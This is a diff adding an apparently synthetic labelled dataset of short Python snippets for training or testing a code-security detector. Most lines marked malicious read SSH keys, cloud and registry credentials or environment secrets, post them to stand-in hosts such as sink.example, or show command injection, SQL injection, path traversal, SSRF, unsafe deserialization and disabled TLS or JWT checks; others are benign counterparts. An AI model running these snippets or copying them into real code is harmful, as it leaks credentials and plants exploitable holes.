@@ -1,0 +1,143 @@
+{"code": "import os\nprint(dict(os.environ))", "label": "malicious", "categories": ["secret_access"]}
+{"code": "import os\nsecret = os.environ.get(\"APP_DATABASE_PASSWORD\")\nprint(secret)", "label": "malicious", "categories": ["secret_access"]}
+{"code": "from pathlib import Path\nprint(Path.home().joinpath(\".ssh\", \"id_rsa\").read_text())", "label": "malicious", "categories": ["secret_access"]}
+{"code": "import os\nkey = open(os.path.expanduser(\"~/.config/app/token.txt\")).read()\nprint(key)", "label": "malicious", "categories": ["secret_access"]}
+{"code": "import os, requests\nrequests.post(\"https://collector.example/upload\", data=os.environ.get(\"PAYMENT_API_KEY\", \"\"))", "label": "malicious", "categories": ["secret_access"]}
+{"code": "from pathlib import Path\np = Path.home() / \".aws\" / \"credentials\"\nprint(p.read_text())", "label": "malicious", "categories": ["secret_access"]}
+{"code": "import os\nfor k, v in os.environ.items():\n    if \"SECRET\" in k or \"TOKEN\" in k:\n        print(k, v)", "label": "malicious", "categories": ["secret_access"]}
+{"code": "import os\nprint(open(os.path.expanduser(\"~/.npmrc\")).read())", "label": "malicious", "categories": ["secret_access"]}
+{"code": "import keyring\npassword = keyring.get_password(\"demo-service\", \"demo-user\")\nprint(password)", "label": "malicious", "categories": ["secret_access"]}
+{"code": "import os\nwith open(os.path.expanduser(\"~/.docker/config.json\")) as f:\n    print(f.read())", "label": "malicious", "categories": ["secret_access"]}
+{"code": "import requests\nrequests.post(\"https://sink.example/collect\", data={\"report\": \"synthetic-test-data\"})", "label": "malicious", "categories": ["data_exfiltration"]}
+{"code": "import os, requests\nrequests.post(\"https://sink.example/upload\", data=os.environ.get(\"DEMO_SECRET\", \"\"))", "label": "malicious", "categories": ["data_exfiltration"]}
+{"code": "from pathlib import Path\nimport requests\ndata = (Path.home() / \".ssh\" / \"id_rsa\").read_text()\nrequests.post(\"https://sink.example/ingest\", data=data)", "label": "malicious", "categories": ["data_exfiltration"]}
+{"code": "import socket\ns = socket.socket()\ns.connect((\"collector.example\", 4444))\ns.sendall(b\"synthetic test payload\")", "label": "malicious", "categories": ["data_exfiltration"]}
+{"code": "import urllib.request\nreq = urllib.request.Request(\"https://sink.example/collect\", data=b\"dummy-secret\")\nurllib.request.urlopen(req, timeout=2)", "label": "malicious", "categories": ["data_exfiltration"]}
+{"code": "import requests\npayload = {\"hostname\": \"demo-host\", \"token\": open(\"/tmp/demo-token\").read()}\nrequests.post(\"https://sink.example/log\", json=payload)", "label": "malicious", "categories": ["data_exfiltration"]}
+{"code": "import os, requests\nfiles = {\"config\": open(os.path.expanduser(\"~/.config/demo/config.json\"), \"rb\")}\nrequests.post(\"https://sink.example/submit\", files=files)", "label": "malicious", "categories": ["data_exfiltration"]}
+{"code": "import http.client\nconn = http.client.HTTPSConnection(\"sink.example\")\nconn.request(\"POST\", \"/upload\", body=\"synthetic-data\")", "label": "malicious", "categories": ["data_exfiltration"]}
+{"code": "import requests\nfor item in [\"alpha\", \"beta\"]:\n    requests.post(\"https://sink.example/collect\", data={\"item\": item})", "label": "malicious", "categories": ["data_exfiltration"]}
+{"code": "import urllib.request\nurllib.request.urlopen(\"https://sink.example/?\" + \"token=dummy-token\", timeout=2)", "label": "malicious", "categories": ["data_exfiltration"]}
+{"code": "import os\nuser_value = input()\nos.system(user_value)", "label": "malicious", "categories": ["command_injection"]}
+{"code": "import subprocess\ncmd = input(\"command: \")\nsubprocess.run(cmd, shell=True)", "label": "malicious", "categories": ["command_injection"]}
+{"code": "import subprocess\nfilename = input()\nsubprocess.Popen(\"cat \" + filename, shell=True)", "label": "malicious", "categories": ["command_injection"]}
+{"code": "import os\npath = input()\nos.popen(\"ls \" + path)", "label": "malicious", "categories": ["command_injection"]}
+{"code": "import subprocess\nhost = input()\nsubprocess.run(f\"ping -c 1 {host}\", shell=True)", "label": "malicious", "categories": ["command_injection"]}
+{"code": "import subprocess\nsubprocess.call(\"grep \" + input() + \" /tmp/demo.txt\", shell=True)", "label": "malicious", "categories": ["command_injection"]}
+{"code": "import os\narg = input()\nos.system(\"echo \" + arg)", "label": "malicious", "categories": ["command_injection"]}
+{"code": "import subprocess\nuser = input()\nsubprocess.run(\"tool --user \" + user, shell=True)", "label": "malicious", "categories": ["command_injection"]}
+{"code": "import subprocess\nvalue = input()\nsubprocess.run([\"sh\", \"-c\", \"echo \" + value])", "label": "malicious", "categories": ["command_injection"]}
+{"code": "import os\nquery = input()\nos.system(\"search-tool \" + query)", "label": "malicious", "categories": ["command_injection"]}
+{"code": "import pickle\nobj = pickle.loads(user_supplied_bytes)", "label": "malicious", "categories": ["unsafe_deserialization"]}
+{"code": "import pickle\nwith open(\"/tmp/untrusted.bin\", \"rb\") as f:\n    obj = pickle.load(f)", "label": "malicious", "categories": ["unsafe_deserialization"]}
+{"code": "import yaml\nobj = yaml.load(untrusted_text, Loader=yaml.Loader)", "label": "malicious", "categories": ["unsafe_deserialization"]}
+{"code": "import yaml\nobj = yaml.unsafe_load(untrusted_text)", "label": "malicious", "categories": ["unsafe_deserialization"]}
+{"code": "import marshal\nobj = marshal.loads(untrusted_bytes)", "label": "malicious", "categories": ["unsafe_deserialization"]}
+{"code": "import shelve\ndb = shelve.open(user_controlled_path)\nprint(db.get(\"item\"))", "label": "malicious", "categories": ["unsafe_deserialization"]}
+{"code": "import dill\nobj = dill.loads(untrusted_bytes)", "label": "malicious", "categories": ["unsafe_deserialization"]}
+{"code": "import cloudpickle\nobj = cloudpickle.loads(uploaded_payload)", "label": "malicious", "categories": ["unsafe_deserialization"]}
+{"code": "import json\nobj = jsonpickle.decode(untrusted_text)", "label": "malicious", "categories": ["unsafe_deserialization"]}
+{"code": "import pickle\ndef restore(payload):\n    return pickle.loads(payload)", "label": "malicious", "categories": ["unsafe_deserialization"]}
+{"code": "query = \"SELECT * FROM users WHERE name = '\" + username + \"'\"", "label": "malicious", "categories": ["sql_injection"]}
+{"code": "cursor.execute(f\"SELECT * FROM accounts WHERE id = {user_id}\")", "label": "malicious", "categories": ["sql_injection"]}
+{"code": "sql = \"DELETE FROM sessions WHERE token = '%s'\" % token\ncursor.execute(sql)", "label": "malicious", "categories": ["sql_injection"]}
+{"code": "query = \"SELECT * FROM products WHERE category = \" + request.args[\"category\"]\ncursor.execute(query)", "label": "malicious", "categories": ["sql_injection"]}
+{"code": "cursor.execute(\"UPDATE users SET role='\" + role + \"' WHERE id=\" + uid)", "label": "malicious", "categories": ["sql_injection"]}
+{"code": "sql = \"SELECT * FROM orders WHERE email = '%s'\" % email\ndb.execute(sql)", "label": "malicious", "categories": ["sql_injection"]}
+{"code": "cursor.executescript(\"SELECT * FROM logs WHERE tag='\" + tag + \"'\")", "label": "malicious", "categories": ["sql_injection"]}
+{"code": "query = \"SELECT * FROM inventory WHERE sku = '\" + sku + \"'\"\nconnection.execute(query)", "label": "malicious", "categories": ["sql_injection"]}
+{"code": "cursor.execute(\"SELECT * FROM users WHERE name = '%s'\" % name)", "label": "malicious", "categories": ["sql_injection"]}
+{"code": "sql = f\"INSERT INTO audit(message) VALUES ('{message}')\"\ncursor.execute(sql)", "label": "malicious", "categories": ["sql_injection"]}
+{"code": "from pathlib import Path\np = Path(\"/srv/app/files\") / user_filename\nprint(p.read_text())", "label": "malicious", "categories": ["path_traversal"]}
+{"code": "import os\nname = input()\nopen(\"/srv/uploads/\" + name, \"rb\").read()", "label": "malicious", "categories": ["path_traversal"]}
+{"code": "from flask import request\npath = \"/var/app/reports/\" + request.args[\"file\"]\nreturn open(path).read()", "label": "malicious", "categories": ["path_traversal"]}
+{"code": "import pathlib\ntarget = pathlib.Path(\"/app/data\") / request.json[\"path\"]\ntarget.write_text(\"demo\")", "label": "malicious", "categories": ["path_traversal"]}
+{"code": "import os\nfilename = input()\nos.remove(\"/srv/app/data/\" + filename)", "label": "malicious", "categories": ["path_traversal"]}
+{"code": "from pathlib import Path\ndest = Path(\"/var/www/uploads\") / supplied_name\ndest.write_bytes(upload.read())", "label": "malicious", "categories": ["path_traversal"]}
+{"code": "import os\ncandidate = os.path.join(\"/opt/app/config\", user_path)\nprint(open(candidate).read())", "label": "malicious", "categories": ["path_traversal"]}
+{"code": "from pathlib import Path\narchive_name = input()\n(Path(\"/tmp/extract\") / archive_name).write_text(\"data\")", "label": "malicious", "categories": ["path_traversal"]}
+{"code": "import os\npath = os.path.join(\"/srv/private\", request.args.get(\"name\"))\nreturn open(path).read()", "label": "malicious", "categories": ["path_traversal"]}
+{"code": "from pathlib import Path\nuser_path = input()\n(Path(\"/app/public\") / user_path).unlink()", "label": "malicious", "categories": ["path_traversal"]}
+{"code": "import requests\nrequests.get(user_supplied_url, timeout=3)", "label": "malicious", "categories": ["ssrf"]}
+{"code": "import urllib.request\nurllib.request.urlopen(request.args[\"url\"], timeout=3)", "label": "malicious", "categories": ["ssrf"]}
+{"code": "import requests\nurl = payload[\"callback\"]\nrequests.post(url, json={\"status\": \"ok\"})", "label": "malicious", "categories": ["ssrf"]}
+{"code": "import httpx\nhttpx.get(form_data[\"url\"], follow_redirects=True)", "label": "malicious", "categories": ["ssrf"]}
+{"code": "import requests\nimage_url = input()\nrequests.get(image_url, stream=True, timeout=5)", "label": "malicious", "categories": ["ssrf"]}
+{"code": "import urllib.request\nurl = config[\"webhook_url\"]\nurllib.request.urlopen(url)", "label": "malicious", "categories": ["ssrf"]}
+{"code": "import requests\nresponse = requests.get(request.json[\"preview_url\"], timeout=5)", "label": "malicious", "categories": ["ssrf"]}
+{"code": "import http.client\nhost = input()\nconn = http.client.HTTPConnection(host)\nconn.request(\"GET\", \"/\")", "label": "malicious", "categories": ["ssrf"]}
+{"code": "import requests\nfor url in submitted_urls:\n    requests.get(url, timeout=2)", "label": "malicious", "categories": ["ssrf"]}
+{"code": "import requests\nrequests.post(user_config[\"endpoint\"], data=\"demo\", timeout=3)", "label": "malicious", "categories": ["ssrf"]}
+{"code": "import hashlib\ndigest = hashlib.md5(password.encode()).hexdigest()", "label": "malicious", "categories": ["weak_crypto"]}
+{"code": "import hashlib\ndigest = hashlib.sha1(password.encode()).hexdigest()", "label": "malicious", "categories": ["weak_crypto"]}
+{"code": "import random\nreset_code = str(random.randint(100000, 999999))", "label": "malicious", "categories": ["weak_crypto"]}
+{"code": "import random\nsession_token = \"\".join(random.choice(\"abcdef0123456789\") for _ in range(32))", "label": "malicious", "categories": ["weak_crypto"]}
+{"code": "from Crypto.Cipher import DES\ncipher = DES.new(key, DES.MODE_ECB)", "label": "malicious", "categories": ["weak_crypto"]}
+{"code": "import ssl\ncontext = ssl._create_unverified_context()", "label": "malicious", "categories": ["weak_crypto"]}
+{"code": "import hashlib\nstored = hashlib.md5(user_password.encode()).digest()", "label": "malicious", "categories": ["weak_crypto"]}
+{"code": "import random\ncsrf_token = str(random.random())", "label": "malicious", "categories": ["weak_crypto"]}
+{"code": "from Crypto.Cipher import AES\ncipher = AES.new(key, AES.MODE_ECB)", "label": "malicious", "categories": ["weak_crypto"]}
+{"code": "import hashlib\npassword_hash = hashlib.sha1(password.encode()).hexdigest()", "label": "malicious", "categories": ["weak_crypto"]}
+{"code": "import requests\nrequests.get(\"https://api.example\", verify=False)", "label": "malicious", "categories": ["unsafe_tls_or_jwt"]}
+{"code": "import urllib3\nurllib3.disable_warnings()\nurllib3.PoolManager(cert_reqs=\"CERT_NONE\")", "label": "malicious", "categories": ["unsafe_tls_or_jwt"]}
+{"code": "import jwt\npayload = jwt.decode(token, options={\"verify_signature\": False})", "label": "malicious", "categories": ["unsafe_tls_or_jwt"]}
+{"code": "import jwt\npayload = jwt.decode(token, key, algorithms=[\"none\"])", "label": "malicious", "categories": ["unsafe_tls_or_jwt"]}
+{"code": "import ssl\ncontext = ssl.SSLContext()\ncontext.check_hostname = False\ncontext.verify_mode = ssl.CERT_NONE", "label": "malicious", "categories": ["unsafe_tls_or_jwt"]}
+{"code": "import requests\nrequests.post(\"https://api.example\", json=data, verify=False)", "label": "malicious", "categories": ["unsafe_tls_or_jwt"]}
+{"code": "import jwt\nclaims = jwt.decode(token, options={\"verify_exp\": False, \"verify_signature\": False})", "label": "malicious", "categories": ["unsafe_tls_or_jwt"]}
+{"code": "import ssl\ncontext = ssl._create_unverified_context()\nclient.connect(context=context)", "label": "malicious", "categories": ["unsafe_tls_or_jwt"]}
+{"code": "import urllib3\nhttp = urllib3.PoolManager(cert_reqs=\"CERT_NONE\")\nhttp.request(\"GET\", \"https://api.example\")", "label": "malicious", "categories": ["unsafe_tls_or_jwt"]}
+{"code": "import jwt\njwt.decode(token, options={\"verify_signature\": False, \"verify_aud\": False})", "label": "malicious", "categories": ["unsafe_tls_or_jwt"]}
+{"code": "import subprocess\nsubprocess.run([\"git\", \"status\", \"--short\"], check=True, shell=False)", "label": "benign", "categories": []}
+{"code": "import tempfile, shutil\nd = tempfile.mkdtemp(prefix=\"codeguard-test-\")\nshutil.rmtree(d)", "label": "benign", "categories": []}
+{"code": "cursor.execute(\"SELECT * FROM users WHERE name = ?\", (username,))", "label": "benign", "categories": []}
+{"code": "import yaml\nconfig = yaml.safe_load(untrusted_text)", "label": "benign", "categories": []}
+{"code": "import hashlib\nchecksum = hashlib.sha256(file_bytes).hexdigest()", "label": "benign", "categories": []}
+{"code": "import requests\nrequests.get(\"https://api.example/status\", timeout=3)", "label": "benign", "categories": []}
+{"code": "from pathlib import Path\nconfig = Path(\"/etc/demo/app.toml\").read_text()", "label": "benign", "categories": []}
+{"code": "import os\nmode = os.environ.get(\"APP_MODE\", \"development\")\nprint(mode)", "label": "benign", "categories": []}
+{"code": "import random\ncolor_index = random.randint(0, 5)", "label": "benign", "categories": []}
+{"code": "import socket\nwith socket.socket() as server:\n    server.bind((\"127.0.0.1\", 0))\n    server.listen(1)", "label": "benign", "categories": []}
+{"code": "import json\nsettings = json.loads('{\"theme\": \"dark\", \"font_size\": 14}')", "label": "benign", "categories": []}
+{"code": "import subprocess\nsubprocess.run([\"python\", \"--version\"], check=True)", "label": "benign", "categories": []}
+{"code": "from pathlib import Path\np = Path(\"/tmp/codeguard-demo-output.txt\")\nif p.exists():\n    p.unlink()", "label": "benign", "categories": []}
+{"code": "import requests\nrequests.get(\"https://status.example/health\", timeout=2)", "label": "benign", "categories": []}
+{"code": "from pathlib import Path\nroot = Path(\"/srv/app/uploads\").resolve()\ncandidate = (root / \"report.txt\").resolve()\nif candidate.is_relative_to(root):\n    print(candidate)", "label": "benign", "categories": []}
+{"code": "from hashlib import scrypt\nderived = scrypt(password.encode(), salt=b\"synthetic-salt\", n=2**14, r=8, p=1)", "label": "benign", "categories": []}
+{"code": "import hmac\nvalid = hmac.compare_digest(supplied_token, expected_token)", "label": "benign", "categories": []}
+{"code": "from sqlalchemy import text\ndb.execute(text(\"SELECT * FROM users WHERE id=:id\"), {\"id\": user_id})", "label": "benign", "categories": []}
+{"code": "import tarfile\nwith tarfile.open(\"fixture.tar\") as archive:\n    archive.extractall(\"/tmp/codeguard-fixture\", filter=\"data\")", "label": "benign", "categories": []}
+{"code": "import jwt\nclaims = jwt.decode(token, key, algorithms=[\"HS256\"], options={\"verify_signature\": True})", "label": "benign", "categories": []}
+{"code": "from lxml import etree\nparser = etree.XMLParser(resolve_entities=False, load_dtd=False, no_network=True)\nroot = etree.fromstring(xml_bytes, parser)", "label": "benign", "categories": []}
+{"code": "from urllib.parse import urlparse\nhost = urlparse(url).hostname\nif host in {\"api.example\", \"status.example\"}:\n    print(\"allowlisted\")", "label": "benign", "categories": []}
+{"code": "import tempfile\nwith tempfile.NamedTemporaryFile(mode=\"w+\", delete=True) as f:\n    f.write(\"synthetic data\")", "label": "benign", "categories": []}
+{"code": "import hashlib\nfingerprint = hashlib.sha256(content).hexdigest()", "label": "benign", "categories": []}
+{"code": "import logging\nlogging.info(\"Authentication attempt for user_id=%s\", user_id)", "label": "benign", "categories": []}
+{"code": "import os\nconfigured = bool(os.environ.get(\"SERVICE_TOKEN\"))\nprint(\"token configured:\", configured)", "label": "benign", "categories": []}
+{"code": "from pathlib import Path\nroot = Path(\"/srv/app/files\").resolve()\ncandidate = (root / filename).resolve()\nif candidate.is_relative_to(root) and candidate.is_file():\n    print(candidate.read_text())", "label": "benign", "categories": []}
+{"code": "import subprocess\nsubprocess.run([\"/usr/bin/tool\", \"--version\"], check=True, timeout=2)", "label": "benign", "categories": []}
+{"code": "cursor.execute(\"SELECT COUNT(*) FROM sessions\")", "label": "benign", "categories": []}
+{"code": "import hashlib\nartifact_digest = hashlib.sha256(artifact_bytes).hexdigest()", "label": "benign", "categories": []}
+{"code": "import ssl\ncontext = ssl.create_default_context()\nprint(context.verify_mode)", "label": "benign", "categories": []}
+{"code": "from pathlib import Path\nPath(\"/tmp/codeguard-safe-fixture.txt\").write_text(\"demo output\")", "label": "benign", "categories": []}
+{"code": "import os, tempfile\nfd, name = tempfile.mkstemp()\nos.close(fd)\nos.remove(name)", "label": "benign", "categories": []}
+{"code": "import os\nallowed = {\"APP_MODE\", \"LOG_LEVEL\"}\nsettings = {k: os.environ[k] for k in allowed if k in os.environ}", "label": "benign", "categories": []}
+{"code": "from urllib.parse import urlparse\nparsed = urlparse(\"https://docs.example/guide\")\nprint(parsed.hostname)", "label": "benign", "categories": []}
+{"code": "import subprocess\nresult = subprocess.run([\"git\", \"rev-parse\", \"--show-toplevel\"], capture_output=True, text=True, check=True)", "label": "benign", "categories": []}
+{"code": "import ast\nvalue = ast.literal_eval(\"[1, 2, 3]\")", "label": "benign", "categories": []}
+{"code": "import yaml\ndata = yaml.load(config_text, Loader=yaml.SafeLoader)", "label": "benign", "categories": []}
+{"code": "from pathlib import Path\ntext = Path(\"/tmp/codeguard-fixture.txt\").read_text()", "label": "benign", "categories": []}
+{"code": "cursor.execute(\"UPDATE tasks SET status = ? WHERE id = ?\", (status, task_id))", "label": "benign", "categories": []}
+{"code": "import random\nsample = random.choice([\"red\", \"blue\", \"green\"])", "label": "benign", "categories": []}
+{"code": "app.run(host=\"127.0.0.1\", debug=False)", "label": "benign", "categories": []}
+{"code": "import hmac, hashlib\nsignature = hmac.new(secret_key, message, hashlib.sha256).hexdigest()", "label": "benign", "categories": []}
+{"code": "import xml.etree.ElementTree as ET\nroot = ET.fromstring(\"<status>ok</status>\")", "label": "benign", "categories": []}
+{"code": "import requests\nrequests.get(\"http://127.0.0.1:8080/health\", timeout=1)", "label": "benign", "categories": []}
+{"code": "import tempfile, shutil\nwith tempfile.TemporaryDirectory(prefix=\"cg-\") as d:\n    print(d)", "label": "benign", "categories": []}
+{"code": "import subprocess\nsubprocess.run([\"echo\", \"hello\"], check=True, shell=False)", "label": "benign", "categories": []}
+{"code": "import os\nnames = sorted(os.environ.keys())\nprint(names)", "label": "benign", "categories": []}
+{"code": "from pathlib import Path\nfile_path = Path(\"/srv/app/reports\") / \"weekly.csv\"\nprint(file_path.name)", "label": "benign", "categories": []}
+{"code": "# Password hashing should use a vetted password-hashing library.\n# This fixture intentionally contains no real credentials.\npassword_hash = hash_password_with_argon2(\"synthetic-password\")", "label": "benign", "categories": []}
+{"code": "logger.info(\"request failed; authorization header redacted\")", "label": "benign", "categories": []}
+{"code": "import json\npayload = json.dumps({\"status\": \"ok\", \"count\": 3})", "label": "benign", "categories": []}
+{"code": "import requests\nrequests.get(\"https://api.example/v1/health\", timeout=3)", "label": "benign", "categories": []}
